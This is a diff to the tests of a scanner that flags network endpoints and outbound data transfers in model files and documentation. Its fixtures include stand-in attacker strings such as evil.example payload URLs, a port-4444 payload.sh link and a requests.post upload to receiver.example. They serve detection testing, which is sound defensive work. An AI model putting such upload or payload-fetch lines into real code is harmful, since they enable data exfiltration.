-        and check.severity == (IssueSeverity.WARNING if active else IssueSeverity.INFO)
-        for check in _failed_network_detection_checks(TextScanner().scan(str(path)))
+    assert (
+        any(
+            check.details.get("domain") == "publisher.dev"
+            and check.details.get("position") == source.rindex(b"publisher.dev")
+            and check.severity == IssueSeverity.WARNING
+            for check in _failed_network_detection_checks(TextScanner().scan(str(path)))
+        )
+        is active
     )
 
 
@@ -7001,12 +6683,7 @@ def test_documented_sql_domain_keeps_its_position_before_local_filenames(tmp_pat
     ).encode()
     path.write_bytes(content)
     checks = _failed_network_detection_checks(TextScanner().scan(str(path)))
-    assert any(
-        check.details.get("domain") == "example.net"
-        and check.details.get("position") == content.index(b"example.net")
-        and check.severity == IssueSeverity.INFO
-        for check in checks
-    )
+    assert not any(check.details.get("position") == content.index(b"example.net") for check in checks)
     assert determine_exit_code(scan_model_directory_or_file(str(path), cache_enabled=False)) == 0
 
 
@@ -7032,9 +6709,7 @@ def test_documented_sql_domain_is_distinct_from_active_hostnames(tmp_path: Path,
         for detail in [check.details, *check.details.get("deduplicated_related_findings", [])]
         if detail.get("type") == "domain_name"
     }
-    assert {(offset, severity) for domain, offset, severity in observed if domain == "example.net"} == {
-        (content.index(b"example.net"), IssueSeverity.INFO)
-    }
+    assert not any(offset == content.index(b"example.net") for _, offset, _ in observed)
     assert any(
         domain == host
         and offset == content.rindex(host.encode())
@@ -7765,8 +7440,7 @@ def _assert_model_card_endpoint_informational(tmp_path: Path, content: str) -> N
 
     network_checks = _failed_network_detection_checks(result)
 
-    assert network_checks
-    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert not network_checks
     assert determine_exit_code(aggregate) == 0
 
 
@@ -7831,35 +7505,6 @@ def _assert_model_card_endpoint_evidence(tmp_path: Path, source_text: str) -> No
     assert determine_exit_code(aggregate) == 1
 
 
-def _assert_endpoint_redaction_limit(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, endpoint_text: str) -> None:
-    monkeypatch.setattr(network_comm, "_redact_network_evidence", lambda text: text)
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        "api_key references below are documentation-only.\n"
-        + "\n".join(f"Reference {index}: https://cdn.openai.com/papers/{index}.pdf" for index in range(40))
-        + endpoint_text,
-        encoding="utf-8",
-    )
-
-    result = TextScanner(config={"check_secrets": False}).scan(str(text_path))
-    aggregate = scan_model_directory_or_file(
-        str(text_path),
-        config={"check_secrets": False},
-        cache_enabled=False,
-    )
-
-    assert result.success is False
-    assert result.metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
-    assert result.metadata.get("operational_error_reason") == "text_content_security_finding_limit"
-    assert determine_exit_code(aggregate) == 2
-    assert any(
-        check.name == "Text Content Security Coverage"
-        and check.details.get("truncated_finding_type") == "endpoint_redaction_classification"
-        and check.details.get("scan_outcome_reason") == "text_content_security_finding_limit"
-        for check in result.checks
-    )
-
-
 def _assert_vocabulary_endpoint(tmp_path: Path, filename: str) -> None:
     text_path = tmp_path / filename
     result = _scan_text_content(text_path, "endpoint=https://evil.example/payload\n")
@@ -7906,7 +7551,8 @@ def _assert_network_info(tmp_path: Path, content: str, finding_type: str, detail
 def _assert_active_url_limit(tmp_path: Path, finding_limit: int) -> None:
     text_path = tmp_path / "tokens.txt"
     text_path.write_text(
-        ("https://docs.example.com/reference\n" * finding_limit) + "endpoint=https://evil.example/payload\n",
+        "https://docs.example.com/reference\n" * 20
+        + "".join(f'endpoint = "https://site{index}.example/payload"\n' for index in range(finding_limit + 1)),
         encoding="utf-8",
     )
 
@@ -7984,8 +7630,7 @@ def _assert_bibliography_informational(tmp_path: Path, content: str) -> None:
         if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
     ]
 
-    assert network_checks
-    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert not network_checks
     assert determine_exit_code(aggregate) == 0
 
 
@@ -7993,3 +7638,40 @@ def _scan_text_content(text_path: Path, content: str) -> ScanResult:
     text_path.write_bytes(content.encode("utf-8"))
     result = TextScanner().scan(str(text_path))
     return result
+
+
+@pytest.mark.parametrize("filename", ["README.md", "model_card.md", "notes.txt", "vocab.txt"])
+@pytest.mark.parametrize("newline", ["\n", "\r\n"])
+def test_passive_references_skip_endpoint_limits(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, filename: str, newline: str
+) -> None:
+    path = tmp_path / filename
+    front_matter = ["---", "language:", *["- en"] * 110, "---", ""]
+    references = [
+        "Paper (published as [link](https://bit.ly/cmd?lang=en)).",
+        "| citation | https://cdn.example.org:4444/payload.sh |",
+        "s3://research/paper.pdf",
+        "8.8.8.8:4444",
+        "research.example",
+    ] * 100
+    path.write_bytes(newline.join(front_matter + references + [""]).encode())
+    monkeypatch.setattr(text_scanner_module, "MAX_DOCUMENTATION_TOTAL_CALL_PARSE_BYTES", 0)
+    monkeypatch.setattr(text_scanner_module, "MAX_DOCUMENTATION_QUOTE_PARSE_WORK", 0)
+
+    result = TextScanner(config={"text_content_max_findings": 1}).scan(str(path))
+
+    assert result.success
+    assert not _failed_network_detection_checks(result)
+    assert not result.metadata.get("analysis_incomplete")
+    assert not result.issues
+
+
+def test_passive_references_do_not_displace_outbound_transfer(tmp_path: Path) -> None:
+    path = tmp_path / "model_card.md"
+    content = "See https://bit.ly/paper for details.\n" * 100
+    content += 'requests.post("https://receiver.example/upload", data=payload)\n'
+    result = _scan_text_content(path, content)
+
+    assert not result.metadata.get("analysis_incomplete")
+    assert any(check.details.get("function") == "requests.post" for check in _failed_network_detection_checks(result))
+    assert not any("bit.ly" in check.message for check in _failed_network_detection_checks(result))
